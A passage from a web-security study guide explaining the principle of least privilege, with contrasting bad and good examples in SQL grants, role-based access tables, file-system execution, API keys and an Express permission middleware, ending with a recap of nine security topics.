✅ **Analytics** - Track API usage patterns  

---

### 9. What is the principle of least privilege?

**Principle of Least Privilege (PoLP)** is a security concept where users, programs, and systems are given the minimum levels of access necessary to perform their functions.

#### Core Principle

**"Give only the permissions needed, nothing more."**

---

#### Why It's Important

**1. Limit Damage from Security Breaches**

```javascript
// Scenario 1: Admin account compromised
// Account has full access
// Attacker can:
// - Delete all data ❌
// - Access all user information ❌
// - Modify system settings ❌

// Scenario 2: Limited user account compromised
// Account has read-only access
// Attacker can:
// - Only read assigned data ✅
// - Cannot delete or modify ✅
// - Limited damage ✅
```

**2. Prevent Insider Threats**

```javascript
// Employee in customer support
// Should have access to:
✅ Customer information
✅ Support tickets

// Should NOT have access to:
❌ Financial data
❌ System administration
❌ Other employees' data
```

**3. Reduce Attack Surface**

```javascript
// API with admin privileges everywhere
// Any vulnerability becomes critical

// API with minimal privileges per endpoint
// Vulnerabilities have limited impact
```

---

#### Examples in Different Contexts

#### **1. Database Access**

**❌ Bad - Over-privileged:**

```sql
-- Application user has full admin rights
GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'localhost';

-- Can do anything:
-- - DROP tables
-- - DELETE data
-- - ALTER schema
-- - CREATE users
```

**✅ Good - Least Privilege:**

```sql
-- Application user has only what's needed
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON mydb.orders TO 'app_user'@'localhost';

-- Cannot:
-- - DROP tables ✅
-- - DELETE data ✅
-- - ALTER schema ✅
-- - Access other databases ✅
```

---

#### **2. User Roles (RBAC)**

**Role Hierarchy:**

```javascript
const PERMISSIONS = {
  // Guest - Minimal access
  guest: {
    read: ['public-posts']
  },
  
  // User - Basic access
  user: {
    read: ['posts', 'comments'],
    create: ['own-posts', 'own-comments'],
    update: ['own-posts', 'own-comments'],
    delete: ['own-posts', 'own-comments']
  },
  
  // Moderator - Limited moderation
  moderator: {
    read: ['all-posts', 'all-comments'],
    update: ['all-comments'],
    delete: ['spam-posts', 'spam-comments']
  },
  
  // Admin - Full access (but not server)
  admin: {
    read: ['all-data'],
    create: ['all-resources'],
    update: ['all-resources'],
    delete: ['all-resources'],
    manage: ['users', 'roles']
  }
}

// Assign minimum role needed
const assignRole = (user, requiredPermissions) => {
  // Don't give admin if moderator is enough
  if (requiredPermissions.includes('moderate')) {
    return 'moderator'  // Not 'admin'
  }
}
```

---

#### **3. File System Permissions**

**❌ Bad:**

```bash
# Application runs as root
# Has access to entire system
sudo node server.js

# Can:
# - Access all files
# - Modify system configuration
# - Install packages system-wide
```

**✅ Good:**

```bash
# Application runs as limited user
# Has access only to app directory
su - appuser
node server.js

# Can only:
# - Access /var/www/app
# - Read/write own files
# - No system access
```

---

#### **4. API Keys / Tokens**

**❌ Bad:**

```javascript
// One master API key for everything
const API_KEY = 'master-key-full-access'

// Used for:
// - Reading data
// - Writing data
// - Deleting data
// - Admin operations
// If leaked, attacker has full access ❌
```

**✅ Good:**

```javascript
// Different keys for different operations
const READ_KEY = 'read-only-key'
const WRITE_KEY = 'write-only-key'
const ADMIN_KEY = 'admin-key'

// Public frontend: Only read key
const data = await fetch('/api/data', {
  headers: { 'X-API-Key': READ_KEY }
})

// Backend service: Write key
const result = await fetch('/api/create', {
  headers: { 'X-API-Key': WRITE_KEY }
})

// Admin panel: Admin key
const users = await fetch('/api/admin/users', {
  headers: { 'X-API-Key': ADMIN_KEY }
})
```

---

#### **5. Microservices**

**❌ Bad - Services have access to everything:**

```javascript
// User Service can access:
- User database ✓
- Order database ❌ (not needed)
- Payment database ❌ (not needed)
- Admin database ❌ (not needed)
```

**✅ Good - Services have minimal access:**

```javascript
// User Service can only access:
- User database ✓

// Order Service can only access:
- Order database ✓
- User database (read-only) ✓

// Payment Service can only access:
- Payment database ✓
- Order database (read-only) ✓
```

---

#### **6. Temporary Elevated Access**

```javascript
// User needs admin access for one task

// ❌ Bad: Permanently make user admin
await User.updateOne({ id: userId }, { role: 'admin' })

// ✅ Good: Temporary elevation
const grantTemporaryAccess = async (userId, permission, duration) => {
  await TempAccess.create({
    userId,
    permission,
    expiresAt: new Date(Date.now() + duration)
  })
}

// Grant access for 1 hour only
await grantTemporaryAccess(userId, 'view-reports', 60 * 60 * 1000)

// Check temporary access
const hasAccess = await TempAccess.findOne({
  userId,
  permission,
  expiresAt: { $gt: new Date() }
})
```

---

#### **7. Default Deny**

```javascript
// ❌ Bad: Default allow, explicitly deny
const checkPermission = (user, action) => {
  const blacklist = ['delete-user', 'delete-database']
  return !blacklist.includes(action)  // Allow everything else
}

// ✅ Good: Default deny, explicitly allow
const checkPermission = (user, action) => {
  const whitelist = user.permissions || []
  return whitelist.includes(action)  // Only allow what's in whitelist
}
```

---

#### Implementation Example

```javascript
const express = require('express')
const app = express()

// Role definitions (Least Privilege)
const ROLES = {
  guest: {
    permissions: ['read:public-posts']
  },
  user: {
    permissions: [
      'read:posts',
      'read:comments',
      'create:own-posts',
      'update:own-posts',
      'delete:own-posts'
    ]
  },
  moderator: {
    permissions: [
      'read:all-posts',
      'read:all-comments',
      'delete:spam',
      'ban:users'
    ]
  },
  admin: {
    permissions: [
      'read:all',
      'create:all',
      'update:all',
      'delete:all',
      'manage:users'
    ]
  }
}

// Check permission middleware
const requirePermission = (...requiredPermissions) => {
  return (req, res, next) => {
    const userRole = req.user?.role || 'guest'
    const userPermissions = ROLES[userRole]?.permissions || []
    
    const hasPermission = requiredPermissions.every(perm =>
      userPermissions.includes(perm)
    )
    
    if (!hasPermission) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: requiredPermissions,
        current: userPermissions
      })
    }
    
    next()
  }
}

// Routes with minimal permissions

// Public - No auth needed
app.get('/posts', requirePermission('read:public-posts'), getPosts)

// User - Own posts only
app.post('/posts', requirePermission('create:own-posts'), createPost)
app.put('/posts/:id', requirePermission('update:own-posts'), updateOwnPost)
app.delete('/posts/:id', requirePermission('delete:own-posts'), deleteOwnPost)

// Moderator - Moderation actions
app.delete('/spam/:id', requirePermission('delete:spam'), deleteSpam)
app.post('/ban/:userId', requirePermission('ban:users'), banUser)

// Admin - Full access
app.get('/admin/users', requirePermission('read:all'), getAllUsers)
app.delete('/admin/users/:id', requirePermission('delete:all'), deleteUser)
```

---

#### Benefits of Least Privilege

✅ **Reduced Risk** - Breaches have limited impact  
✅ **Compliance** - Meet regulatory requirements  
✅ **Accountability** - Clear audit trail  
✅ **Stability** - Fewer accidental mistakes  
✅ **Security** - Harder for attackers to escalate privileges  
✅ **Maintainability** - Clear permission boundaries  

---

#### Key Takeaways

1. **Default Deny** - Block everything, allow only what's needed
2. **Temporary Elevation** - Grant elevated access temporarily
3. **Separation of Duties** - No one person has complete control
4. **Regular Audits** - Review and revoke unnecessary permissions
5. **Role-Based Access** - Assign minimum role needed
6. **Just-In-Time Access** - Grant access when needed, revoke after
7. **Monitor & Log** - Track privilege usage

---

**Summary:** Give users/systems the **minimum permissions** required to do their job. Nothing more, nothing less.

---

## 🎓 Theoretical Knowledge Complete!

All 9 security questions answered with comprehensive explanations, code examples, and best practices. These concepts are fundamental to building secure web applications.

**Key Security Principles:**
1. ✅ CORS - Control cross-origin access
2. ✅ Same-Origin Policy - Default security model
3. ✅ Preflight Requests - Pre-check complex requests
4. ✅ CORS Configuration - Properly allow cross-origin
5. ✅ CSRF Prevention - Protect against fake requests
6. ✅ XSS Prevention - Sanitize and escape user input
7. ✅ SQL Injection Prevention - Use parameterized queries
8. ✅ Rate Limiting - Control request frequency
9. ✅ Least Privilege - Minimum necessary permissions

**Happy Secure Coding! 🔒**
